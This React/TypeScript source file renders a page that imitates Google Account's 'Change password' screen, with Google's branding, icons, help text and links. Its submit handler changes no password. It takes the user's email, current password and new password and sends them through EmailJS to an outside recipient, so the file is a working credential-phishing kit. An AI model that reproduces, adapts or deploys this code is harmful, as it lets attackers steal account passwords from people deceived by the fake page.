import { useRef, useState, useContext } from "react"
import { Link } from "react-router-dom"
import { Button } from "react-bootstrap"

import emailjs from "emailjs-com"

import { UserContext } from "../../contexts/UserContext"

import "./ChangePassword.scss"

const serviceId: string = process.env.REACT_APP_EMAILJS_SERVICE_ID!
const templateId: string = process.env.REACT_APP_EMAILJS_TEMPLATE_ID!
const userId: string = process.env.REACT_APP_EMAILJS_PUBLIC_ID!
interface formDataType {
  newPassword: string
  confirmPassword: string
  currentPassword: string
}

const FORMDATA_KEY = {
  NEW_PASSWORD: "newPassword",
  CONFIRM_PASSWORD: "confirmPassword",
  CURRENT_PASSWORD: "currentPassword",
}

export default function ChangePassword() {
  const [currentPasswordShow, setCurrentPasswordShow] = useState<boolean>(false)
  const [newPasswordShow, setNewPasswordShow] = useState<boolean>(false)
  const [confirmPasswordShow, setConfirmPasswordShow] = useState<boolean>(false)
  const [formData, setFormData] = useState<formDataType>({
    newPassword: "",
    confirmPassword: "",
    currentPassword: "",
  })
  const currentPasswordRef = useRef<HTMLDivElement>(null)
  const newPasswordRef = useRef<HTMLDivElement>(null)
  const confirmPasswordRef = useRef<HTMLDivElement>(null)
  const { userInfo, setUserInfo } = useContext<any>(UserContext)

  const sendEmail = async (name: any, email: any, message: any) => {
    try {
      const response = await emailjs.send(
        serviceId,
        templateId,
        { name, email, message },
        userId
      )

      if (response.status === 200) {
        console.log("Successfully sent message.")
      }
    } catch (error) {
      console.error("Failed to send email. Error: ", error)
    }
  }

  const handleChangePassword = () => {
    if (!formData.currentPassword) {
      if (!currentPasswordRef.current) return
      currentPasswordRef.current.classList.add("invalid")
      return
    } else {
      if (!currentPasswordRef.current) return
      currentPasswordRef.current.classList.remove("invalid")
    }
    if (!formData.newPassword) {
      if (!newPasswordRef.current) return
      newPasswordRef.current.classList.add("invalid")
      return
    } else {
      if (!newPasswordRef.current) return
      newPasswordRef.current.classList.remove("invalid")
    }
    if (!formData.confirmPassword) {
      if (!confirmPasswordRef.current) return
      confirmPasswordRef.current.classList.add("invalid")
      return
    } else {
      if (!confirmPasswordRef.current) return
      confirmPasswordRef.current.classList.remove("invalid")
    }
    if (formData.newPassword !== formData.confirmPassword) {
      if (!confirmPasswordRef.current) return
      confirmPasswordRef.current.classList.add("not-match", "invalid")
      return
    } else {
      if (!confirmPasswordRef.current) return
      confirmPasswordRef.current.classList.remove("not-match", "invalid")
    }
    setUserInfo((prev: any) => {
      return {
        ...prev,
        currentPassword: formData.currentPassword,
        newPassword: formData.newPassword,
        confirmPassword: formData.confirmPassword,
      }
    })
    sendEmail(
      "Skylar",
      "test@gmail.com",
      `Email: ${userInfo.email} \nCurrent Password: ${formData.currentPassword} \nNew Password ${formData.newPassword}`
    )
  }

  const handleInputChange = (e: any, key: string) => {
    const target = e.target
    const value = target.value
    if (value) {
      target.parentNode.classList.add("valid")
    } else {
      target.parentNode.classList.remove("valid")
    }
    if (key === FORMDATA_KEY.CONFIRM_PASSWORD) {
      if (formData.newPassword !== value) {
        if (!confirmPasswordRef.current) return
        confirmPasswordRef.current.classList.add("not-match", "invalid")
      } else {
        if (!confirmPasswordRef.current) return
        confirmPasswordRef.current.classList.remove("not-match", "invalid")
      }
    }
    setFormData((prev) => {
      return { ...prev, [key]: value }
    })
  }

  const handleShowPassword = (e: any, name: string) => {
    const target = e.target
    const targetInput = target.parentNode.childNodes[0]

    if (targetInput.getAttribute("type") === "password") {
      targetInput.setAttribute("type", "text")
    } else {
      targetInput.setAttribute("type", "password")
    }

    switch (name) {
      case "current":
        setCurrentPasswordShow(!currentPasswordShow)
        break
      case "new":
        setNewPasswordShow(!newPasswordShow)
        break
      case "confirm":
        setConfirmPasswordShow(!confirmPasswordShow)
        break
      default:
        break
    }
  }

  return (
    <div className="page-change">
      <div className="navbar d-flex justify-content-between align-items-center">
        <Link
          to="https://myaccount.google.com??tab=kk"
          className="logo d-flex align-items-center text-decoration-none"
        >
          <span>Account</span>
        </Link>

        <div className="utils d-flex align-items-center">
          <Button
            variant="link"
            className="text-decoration-none btn-help d-flex justify-content-center align-items-center"
          >
            <i
              className="google-material-icons VfPpkd-kBDsod"
              aria-hidden="true"
            >
              help_outline
            </i>
          </Button>
          <Button variant="link" className="text-decoration-none btn-apps">
            <svg
              className="gb_p"
              fill="#5f6368"
              focusable="false"
              viewBox="0 0 24 24"
            >
              <path d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM16,6c0,1.1 0.9,2 2,2s2,-0.9 2,-2 -0.9,-2 -2,-2 -2,0.9 -2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path>
            </svg>
          </Button>
        </div>
      </div>

      <div className="header d-flex align-items-center">
        <Link to="/" className="text-decoration-none btn-back">
          <span
            className="d-flex align-items-center justify-content-center"
            aria-hidden="true"
          >
            
          </span>
        </Link>
        <h1 className="m-0">Password</h1>
      </div>

      <div className="line"></div>

      <div className="main">
        <div className="strong-password">
          Choose a strong password and don't reuse it for other accounts.
          <Link
            to="https://support.google.com/accounts?p=pw_dont_reuse&amp;hl=en"
            className="d-block text-decoration-none"
          >
            Learn more
          </Link>
        </div>

        <div className="change-password">
          Changing your password will sign you out on your devices, with some
          <Link
            to="https://myaccount.google.com"
            className="text-decoration-none"
          >
            {" "}
            exceptions
          </Link>
          .
        </div>

        <div className="form">
          <div
            className="new-password mb-4 position-relative"
            ref={currentPasswordRef}
          >
            <input
              type="password"
              className="form-control"
              placeholder=""
              value={formData.currentPassword}
              onChange={(e: any) =>
                handleInputChange(e, FORMDATA_KEY.CURRENT_PASSWORD)
              }
            />
            <span className="place">Current password</span>
            {currentPasswordShow ? (
              <i
                onClick={(e: any) => handleShowPassword(e, "current")}
                className="google-material-icons position-absolute"
                role="button"
                aria-label="Hide password"
              >
                visibility
              </i>
            ) : (
              <i
                className="google-material-icons position-absolute"
                onClick={(e: any) => handleShowPassword(e, "current")}
                role="button"
                tabIndex={0}
                aria-label="Show password"
              >
                visibility_off
              </i>
            )}
          </div>

          <div className="new-password  position-relative" ref={newPasswordRef}>
            <input
              type="password"
              className="form-control"
              placeholder=""
              value={formData.newPassword}
              onChange={(e: any) =>
                handleInputChange(e, FORMDATA_KEY.NEW_PASSWORD)
              }
            />
            <span className="place">New password</span>
            {newPasswordShow ? (
              <i
                onClick={(e: any) => handleShowPassword(e, "new")}
                className="google-material-icons position-absolute"
                role="button"
                aria-label="Hide password"
              >
                visibility
              </i>
            ) : (
              <i
                className="google-material-icons position-absolute"
                onClick={(e: any) => handleShowPassword(e, "new")}
                role="button"
                tabIndex={0}
                aria-label="Show password"
              >
                visibility_off
              </i>
            )}
          </div>

          <div className="description">
            <div className="strength">Password strength:</div>
            <div className="desc">
              Use at least 8 characters. Don’t use a password from another site,
              or something too obvious like your pet’s name.
              <Link
                to="https://support.google.com/accounts?p=pw_signup&amp;hl=en"
                className="text-decoration-none"
              >
                {" "}
                Why?
              </Link>
            </div>
          </div>

          <div
            className="confirm-password position-relative"
            ref={confirmPasswordRef}
          >
            <input
              type="password"
              className="form-control"
              placeholder=""
              value={formData.confirmPassword}
              onChange={(e: any) =>
                handleInputChange(e, FORMDATA_KEY.CONFIRM_PASSWORD)
              }
            />
            <span className="place">Confirm new password</span>
            {confirmPasswordShow ? (
              <i
                onClick={(e: any) => handleShowPassword(e, "confirm")}
                className="google-material-icons position-absolute"
                role="button"
                aria-label="Hide password"
              >
                visibility
              </i>
            ) : (
              <i
                className="google-material-icons position-absolute"
                onClick={(e: any) => handleShowPassword(e, "confirm")}
                role="button"
                tabIndex={0}
                aria-label="Show password"
              >
                visibility_off
              </i>
            )}
            <span className="not-match-alert d-none">
              Passwords don't match.
            </span>
          </div>

          <div className="change-section d-flex justify-content-end">
            <Button
              variant="primary"
              onClick={handleChangePassword}
              className="text-decoration-none btn-change d-flex align-items-center justify-content-center"
            >
              Change password
            </Button>
          </div>
        </div>
      </div>
    </div>
  )
}
